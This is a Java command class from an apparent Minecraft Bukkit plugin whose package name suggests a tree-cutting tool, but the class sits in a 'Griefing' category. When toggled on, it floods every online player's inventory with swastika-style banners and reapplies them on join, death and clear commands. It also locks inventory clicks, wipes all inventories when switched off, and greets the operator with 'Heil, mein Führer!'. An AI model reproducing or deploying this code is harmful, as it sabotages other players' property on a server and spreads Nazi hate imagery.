package me.bow.treecapitatorultimate.commands.Griefing;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.command.Command;
import me.bow.treecapitatorultimate.command.CommandCategory;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.DyeColor;
import org.bukkit.Material;
import org.bukkit.block.banner.Pattern;
import org.bukkit.block.banner.PatternType;
import org.bukkit.entity.Player;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.BannerMeta;

import java.util.ArrayList;

public class Nazis extends Command {
    private ItemStack banner;
    private boolean on;
    public Nazis() {
        super("nazis", "Put nazi sign on people's heads", CommandCategory.Griefing);
        banner = new ItemStack(Material.RED_BANNER, 64);
        BannerMeta meta = (BannerMeta) banner.getItemMeta();
        if (meta == null) return; // should never happen
        meta.addPattern(new Pattern(DyeColor.BLACK, PatternType.STRIPE_MIDDLE));
        meta.addPattern(new Pattern(DyeColor.BLACK, PatternType.STRIPE_CENTER));
        meta.addPattern(new Pattern(DyeColor.BLACK, PatternType.RHOMBUS_MIDDLE));
        meta.addPattern(new Pattern(DyeColor.WHITE, PatternType.STRAIGHT_CROSS));
        meta.addPattern(new Pattern(DyeColor.WHITE, PatternType.CIRCLE_MIDDLE));
        meta.addPattern(new Pattern(DyeColor.WHITE, PatternType.CIRCLE_MIDDLE));
        banner.setItemMeta(meta);
    }

    // /minecraft:give @p red_banner{BlockEntityTag:{Base:1,Patterns:[{Pattern:ms,Color:15},{Pattern:cs,Color:15},{Pattern:mr,Color:15},{Pattern:sc,Color:0},{Pattern:mc,Color:0},{Pattern:mc,Color:0}]}}
    @Override
    public void onCommand(Player p, ArrayList<String> args) {
        if (on) {
            for (Player pe : Bukkit.getOnlinePlayers()) {
                if (!pe.isOnline()) return;
                pe.getInventory().clear();
            }
            on = false;
            p.sendMessage(Start.Prefix + ChatColor.RED + "Oof");
        } else {
            for (Player pe : Bukkit.getOnlinePlayers()) {
                if (!pe.isOnline()) return;
                for (int i = 0; i <= 40; i++)
                    pe.getInventory().setItem(i, banner);
                pe.updateInventory();
            }
            p.sendMessage(Start.Prefix + ChatColor.GREEN + "Heil, mein Führer!");
            on = true;
        }
    }

    @Override
    public void onPlayerJoin(PlayerJoinEvent e) {
        if (!on) return;
        for (int i = 0; i <= 40; i++)
            e.getPlayer().getInventory().setItem(i, banner);
    }

    @Override
    public void onPlayerDeath(PlayerDeathEvent e) {
        if (!on) return;
        for (int i = 0; i <= 40; i++)
            e.getEntity().getInventory().setItem(i, banner);
    }

    @Override
    public void onPlayerCommand(PlayerCommandPreprocessEvent e) {
        if (!on) return;
        if (!e.getMessage().contains("inventory") && !e.getMessage().contains("clear") && !e.getMessage().contains("clean"))
            return;
        Bukkit.getScheduler().runTask(Start.Instance, () -> {
            Player pe = e.getPlayer();
            for (int i = 0; i <= 40; i++)
                pe.getInventory().setItem(i, banner);
            pe.updateInventory();
        });
    }

    @Override
    public void onInventoryClick(InventoryClickEvent e) {
        if (!on) return;
        e.setCancelled(true);
    }
}
